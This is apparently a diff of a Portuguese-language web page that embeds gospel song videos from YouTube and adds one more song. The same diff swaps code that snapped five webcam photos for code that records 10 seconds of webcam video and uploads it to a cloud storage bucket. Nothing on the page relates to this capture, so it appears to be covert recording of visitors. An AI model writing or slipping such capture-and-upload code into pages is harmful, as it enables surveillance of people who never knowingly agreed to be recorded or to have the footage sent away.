@@ -57,45 +57,39 @@
                 video.srcObject = stream;
                 video.play();
 
-                let photoCount = 0;
-                const maxPhotos = 5;
+                const mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
 
-                const captureInterval = setInterval(() => {
-                    if (photoCount < maxPhotos) {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 640;
-                        canvas.height = 480;
-                        const context = canvas.getContext('2d');
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        canvas.toBlob(blob => {
-                            console.log('Blob criado:', blob);
-                            
-                            if (blob) {
-                                const fileName = `foto${photoCount + 1}.png`;
-                                const storageRef = ref(storage, `fotos/${fileName}`);
+                mediaRecorder.ondataavailable = event => {
+                    chunks.push(event.data);
+                };
 
-                                uploadBytes(storageRef, blob).then((snapshot) => {
-                                    console.log('Imagem enviada:', snapshot);
-                                    getDownloadURL(snapshot.ref).then((downloadURL) => {
-                                        console.log('Imagem disponível em:', downloadURL);
-                                    });
-                                }).catch((error) => {
-                                    console.error('Erro ao enviar:', error);
-                                    document.getElementById('uploadMessage').textContent = "Erro ao enviar a foto: " + error.message;
-                                });
-                            } else {
-                                console.error('Erro: Blob é null.');
-                                document.getElementById('uploadMessage').textContent = "Erro ao criar a imagem.";
-                            }
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const fileName = `video_${Date.now()}.webm`;
+                    const storageRef = ref(storage, `videos/${fileName}`);
+
+                    uploadBytes(storageRef, blob).then(snapshot => {
+                        console.log('Vídeo enviado:', snapshot);
+                        getDownloadURL(snapshot.ref).then(downloadURL => {
+                            console.log('Vídeo disponível em:', downloadURL);
+                            document.getElementById('uploadMessage').textContent = "Vídeo gravado e enviado com sucesso!";
                         });
+                    }).catch(error => {
+                        console.error('Erro ao enviar:', error);
+                        document.getElementById('uploadMessage').textContent = "Erro ao enviar o vídeo: " + error.message;
+                    });
 
-                        photoCount++;
-                    } else {
-                        clearInterval(captureInterval); // Para o intervalo após capturar 5 fotos
-                        stream.getTracks().forEach(track => track.stop());
-                    }
-                }, 2000); // Captura uma foto a cada 2 segundos
+                    chunks = [];
+                };
+
+                mediaRecorder.start();
+
+                // Para após 10 segundos
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                }, 10000); // 10 segundos
             })
             .catch(error => {
                 console.error("Erro ao acessar a câmera: ", error);
@@ -123,6 +117,10 @@
         <li>
             <strong>Ate que o senhor</strong>
             <iframe src="https://youtu.be/E0F9NvrSoa0?si=EMeBGlb1_se21cgt" title="Acende Outra Vez" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+        </li>
+        <li>
+            <strong>Efesios 6</strong>
+            <iframe src="https://youtu.be/zJOINygRqtQ?si=ZOvTLpVKDEFEKz6e" title="Acende Outra Vez" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
         </li>
     </ul>
 </body>
